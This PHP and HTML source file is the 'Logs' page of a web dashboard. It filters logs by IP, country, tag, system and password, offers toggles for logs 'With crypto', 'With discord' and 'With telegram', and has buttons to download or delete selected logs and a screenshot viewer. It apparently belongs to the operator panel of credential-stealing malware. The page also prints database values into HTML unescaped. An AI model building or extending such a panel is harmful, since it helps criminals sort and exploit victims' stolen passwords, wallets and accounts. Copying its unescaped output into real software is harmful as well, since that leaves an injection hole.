<?php
include("./header.php");



?>


<!-- Page Content-->
<div class="page-content">
    <div class="container-xl">
        <!-- Page-Title -->
        <div class="row">
            <div class="col-sm-12">
                <div class="page-title-box">
                    <div class="row">
                        <div class="col">
                            <h4 class="page-title">Logs</h4>
                            <ol class="breadcrumb">
                                <li class="breadcrumb-item">Monitoring</li>

                            </ol>
                        </div>
                        <!--end col-->
                    </div>
                    <!--end row-->
                </div>
                <!--end page-title-box-->
            </div>
            <!--end col-->
        </div>
        <!--end row-->
        <!-- end page title end breadcrumb -->
        <div class="row">
            <div class="col-lg-12">
                <div class="card">
                    <!--end card-header-->
                    <div class="card-body">
                        <div class="row">
                            <div class="col-md-1">
                                <div class="form-group">
                                    <label for="idField">ID</label>
                                    <input type="text" class="form-control" id="idField" required="">
                                </div>
                            </div>
							<div class="col-md-1">
                            <div class="form-group fv-plugins-icon-container">
							
								<label for="tagsField">Tag</label>
								<select class="form-control select2" id="tagsField" multiple="multiple">
									<option label="Tags"></option>
									<?php		
										$tags =  R::getAll( 'SELECT tag, COUNT(*) as count FROM log GROUP BY tag' );
										foreach ($tags as $tag)
										{
											echo '<option value="'.$tag['tag'].'">'.$tag['tag'].' ('.$tag['count'].')</option>';
										}
									?>
									
								</select>

							</div>
                            </div>
                            <div class="col-md-2">
                                <div class="form-group">
                                    <label for="ipField">IP</label>
                                    <input type="email" class="form-control" id="ipField" required="">
                                </div>
                            </div>
                            <div class="col-md-1">
                            <div class="form-group fv-plugins-icon-container">
							
								<label>Country</label>
								<select class="form-control select2" id="countryField" multiple="multiple">
									<option label="All"></option>
									<?php		
										$countries =  R::getAll( 'SELECT country, COUNT(*) as count FROM log GROUP BY country' );
										foreach ($countries as $country)
										{
											echo '<option value="'.$country['country'].'">'.$country['country'].' ('.$country['count'].')</option>';
										}
									?>
									
								</select>

							</div>
							
                            </div>
							<div class="col-md-1">
                            <div class="form-group fv-plugins-icon-container">
								<label for="markerField">Marker</label>



								<select class="form-control select2" id="markerField" multiple="multiple">
									<option label="All markers"></option>
									<?php		
										$markers = R::find('markerrule', 'is_active = ?', ["1"]);
																			
										foreach ($markers as $marker)
										{
											echo '<option value="'.$marker['name'].'">'.$marker['name'].'</option>';
										}
									?>
									
								</select>

							</div>
							
                            </div>
                            <div class="col-md-1">
                                <div class="form-group">
                                    <label for="noteField">Note</label>
                                    <input type="text" class="form-control" id="noteField" required="">
                                </div>
                            </div>
                            <div class="col-md-1">
                                <div class="form-group">
                                    <label for="systemField">System</label>
                                    <input type="email" class="form-control" id="systemField" required="">
                                </div>
                            </div>
                            <div class="col-md-2">
                                <div class="form-group">
                                    <label for="dateField">Date</label>
                                    <div class="input-group" id="dateField">
                                        <input type="text" id="reportrange" class="form-control" value="10/24/1984" style="font-size:11px; height:38px;">

                                    </div>
                                </div>
                            </div>
                            <div class="col-md-2">
                                <div class="form-group">
                                    <label for="passwordField">Password</label>
                                    <input type="email" class="form-control" id="passwordField" required="">
                                </div>
                            </div>
                        </div>

                        <div class="row">
                            <div class="col-lg-2">
                                <div class="custom-control custom-switch switch-primary">
                                    <input type="checkbox" class="custom-control-input" id="emptyCheckbox">
                                    <label class="custom-control-label" for="emptyCheckbox">Hide empty</label>
                                </div>
                            </div>
                            <div class="col-lg-2">
                                <div class="custom-control custom-switch switch-primary">
                                    <input type="checkbox" class="custom-control-input" id="cryptoCheckbox">
                                    <label class="custom-control-label" for="cryptoCheckbox">With crypto</label>
                                </div>
                            </div>
							<div class="col-lg-2">
                                <div class="custom-control custom-switch switch-primary">	
                                    <input type="checkbox" class="custom-control-input" id="extentionsCheckbox">
                                    <label class="custom-control-label" for="extentionsCheckbox">With plugins</label>
                                </div>
                            </div>
                            <div class="col-lg-2">
                                <div class="custom-control custom-switch switch-primary">
                                    <input type="checkbox" class="custom-control-input" id="uniqueCheckbox">
                                    <label class="custom-control-label" for="uniqueCheckbox">Only unique</label>
                                </div>
                            </div>


							<div class="col-sm-1">
								<button type="submit" data-toggle="tooltip" data-placement="top" title="Download selected logs" class="btn btn-block btn-downloadLogs btn-outline-info  btn-sm">Download</button>
							</div>
							<div class="col-sm-1">
								<button type="button" id="btn-deleteLogs" data-toggle="tooltip" data-placement="top" title="Delete selected logs" class="btn btn-block btn-outline-danger  btn-sm">Delete</button>
							</div>
							<div class="col-sm-1">
								<button type="submit" id="btn-dowloadSearched" data-toggle="tooltip" data-placement="top" title="Download searched logs or all logs"  class="btn btn-block btn-outline-info btn-sm ">Searched</button>
							</div>
							<div class="col-sm-1">
								<button type="button" id="btn-search"  class="btn btn-block btn-outline-primary btn-sm" >Search</button>
							</div>


							<div class="col-lg-2">
                                <div class="custom-control custom-switch switch-primary">
                                    <input type="checkbox" class="custom-control-input" id="discordCheckbox">
                                    <label class="custom-control-label" for="discordCheckbox">With discord</label>
                                </div>
                            </div>
							<div class="col-lg-2">
                                <div class="custom-control custom-switch switch-primary">
                                    <input type="checkbox" class="custom-control-input" id="telegramCheckbox">
                                    <label class="custom-control-label" for="telegramCheckbox">With telegram</label>
                                </div>
                            </div>

                        </div>

                        
						
						<div id="rows">
						
                        
						</div>

                        

                    </div>
                </div>
            </div>

        </div> <!-- end col -->

    </div><!-- container -->

    <?php
    include("./footer.php");



    ?>
    <!--end footer-->
</div>
<!-- end page content -->
</div>
<!-- downloader -->
<div class="modal fade" id="modalDownloader" tabindex="-1" role="dialog" aria-labelledby="downloader_label_modal" aria-hidden="true">
      <div class="modal-dialog" role="document" style="max-width: 700px;">
        <div class="modal-content tx-14">
          <div class="modal-header">
            <h6 class="modal-title" id="downloader_label_modal">Download selected logs</h6>
            <button type="button" class="close" data-dismiss="modal" aria-label="Close">
              <span aria-hidden="true">&times;</span>
            </button>
          </div>
          <div class="modal-body">
            <p class="mg-b-0" id="downloader_label" ></p>
			<br>
          </div>
          <div class="modal-footer">
            <button type="button" class="btn btn-secondary tx-13" data-dismiss="modal">Close</button>
          </div>
        </div>
      </div>
    </div>

<!-- Screenshot -->
<div class="modal fade" id="modalScreenshot" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel6" aria-hidden="true">
	<div class="modal-dialog modal-dialog-centered" role="document" style="max-width: 55%;">
		<div class="modal-content tx-14">

			<!-- header -->
			<div class="modal-header">
				<h6 class="modal-title" id="exampleModalLabel6">
					Screenshot
				</h6>
				<button type="button" class="close" data-dismiss="modal" aria-label="Close">
					<span aria-hidden="true">&times;</span>
				</button>
			</div>

			<!-- body -->
			<div class="modal-body3">
				
				
			</div>

			<!-- footer -->
			<div class="modal-footer">
				<button type="button" class="btn btn-secondary tx-13" data-dismiss="modal">
					Close
				</button>
			</div>
		</div>
	</div>
</div>


<!-- jQuery  -->
<script src="assets/js/jquery.min.js"></script>
<script src="assets/js/bootstrap.bundle.min.js"></script>
<script src="assets/js/metismenu.min.js"></script>
<script src="assets/js/waves.js"></script>
<script src="assets/js/feather.min.js"></script>
<script src="assets/js/simplebar.min.js"></script>
<script src="assets/js/moment.js"></script>

<!-- Plugins js -->
<script src="assets/js/jszip.min.js"></script>
<script src="assets/js/FileSaver.min.js"></script>
<script src="assets/js/jszip-utils.min.js"></script>
<script src="assets/js/daterangepicker.js"></script>
<script src="assets/js/select2.min.js"></script>
<script src="assets/js/bootstrap-colorpicker.min.js"></script>
<script src="assets/js/bootstrap-material-datetimepicker.js"></script>
<script src="assets/js/bootstrap-maxlength.min.js"></script>
<script src="assets/js/jquery.bootstrap-touchspin.min.js"></script>

<script src="assets/js/jquery.forms-advanced.js"></script>

<!-- App js -->
<script src="assets/js/app.js"></script>

<!-- Page js -->
<script src="includes/logsactions.js"></script>

<script>
	// ---------------------------------------------------------------------------------------
	// formatCountry
	//
	// View country flag in select2
	// ---------------------------------------------------------------------------------------
	function formatCountry(state) {
		if (!state.id) return state.text;

		var baseUrl = "assets/images/flags";
		
		var $state = $(
			'<span><img src="' + baseUrl + '/' + state.element.value.toLowerCase() + '.png" class="img-flag" style="width: 16px;" /> ' + state.text + '</span>'
		);

		return $state;
	};

	// ---------------------------------------------------------------------------------------
	// 
	//
	// Generate select2 objects
	// ---------------------------------------------------------------------------------------
	(function($) {
		'use strict'

		var Defaults = $.fn.select2.amd.require('select2/defaults');

		$.extend(Defaults.defaults, {
			searchInputPlaceholder: ''
		});

		var SearchDropdown = $.fn.select2.amd.require('select2/dropdown/search');
		var _renderSearchDropdown = SearchDropdown.prototype.render;

		SearchDropdown.prototype.render = function(decorated) {
			var $rendered = _renderSearchDropdown.apply(this, Array.prototype.slice.apply(arguments));
			this.$search.attr('placeholder', this.options.get('searchInputPlaceholder'));

			return $rendered;
		};
	})(window.jQuery);

	// ---------------------------------------------------------------------------------------
	// 
	//
	// Create select2 dropdown
	// ---------------------------------------------------------------------------------------
	$(function() {
		'use strict'

		$('#tagsField').select2({
			placeholder: 'All tags',
			searchInputPlaceholder: 'Search options',
		});

		$('#countryField').select2({
			placeholder: 'All',
			searchInputPlaceholder: 'Search options',
			templateResult: formatCountry
		});
		$('#markerField').select2({
			placeholder: 'All',
			searchInputPlaceholder: 'Search options',
		});

		
	});
</script>
</body>

</html>